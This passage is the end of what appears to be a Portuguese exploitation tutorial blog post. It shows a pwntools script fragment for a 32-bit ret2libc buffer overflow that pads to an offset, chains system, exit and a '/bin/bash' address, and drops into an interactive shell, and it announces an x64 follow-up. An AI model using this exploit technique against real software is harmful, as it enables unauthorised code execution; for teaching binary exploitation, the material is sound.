<span class="s2">            exploit += (&quot;</span><span class="nv">A</span><span class="s2">&quot;*(offset-len(exploit)))+p32(system)+p32(exit)+p32(bash)+&quot;</span><span class="s s-Atom">\xff</span><span class="err">&quot;</span> <span class="s s-Atom">#</span> <span class="mh">0xff</span> <span class="o">=</span> <span class="nv">EOF</span>
            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="s s-Atom">exploit</span><span class="p">)</span>
            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="s s-Atom">#</span> <span class="s s-Atom">g0t</span> <span class="s s-Atom">sh3ll</span> <span class="nb">?</span>
</code></pre></div>


<p>Como em x64 os argumentos ficam nos registradores, precisaremos fazer mais coisa antes de chamar o <em>system,</em> esse será o tópico do próximo post.</p>
<p>Inté !</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>